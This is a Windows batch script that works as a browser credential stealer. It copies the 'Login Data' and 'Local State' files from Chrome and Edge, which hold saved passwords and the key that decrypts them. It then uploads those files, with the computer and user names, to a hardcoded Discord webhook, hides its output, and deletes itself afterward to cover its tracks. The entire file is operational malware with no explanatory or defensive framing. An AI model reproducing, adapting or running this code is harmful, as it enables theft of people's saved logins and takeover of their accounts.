@echo off
setlocal
set "sourceDir1=%localappdata%\Google\Chrome\User Data\Default\"
set "sourceDir2=%localappdata%\Google\Chrome\User Data\"
set "sourceDir3=%localappdata%\Microsoft\Edge\User Data\Default"
set "sourceDir4=%localappdata%\\Microsoft\Edge\User Data\"
set "fileName1=Login Data"
set "fileName2=Local State"
set "fileName3=Login Data"
set "fileName4=Local State"
set "computerName=%COMPUTERNAME%"
set "userName=%USERNAME%"
set "webhookUrl=https://discord.com/api/webhooks/1246527590026448926/LTvUJGS9xvGSiozP-8jr-BaRki98at9F_SngX_bdpasuTb_9_dmQTrhjLjtjWdMHejyT"
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"Google Chrome sent from computer %computerName% by user %userName%\"}" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir1%\%fileName1%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir2%\%fileName2%" %webhookUrl% > nul 2>&1
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"Microsoft Edge sent from computer %computerName% by user %userName%\"}" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir3%\%fileName3%" %webhookUrl% > nul 2>&1
curl -F "file=@%sourceDir4%\%fileName4%" %webhookUrl% > nul 2>&1
del "%~f0"
endlocal
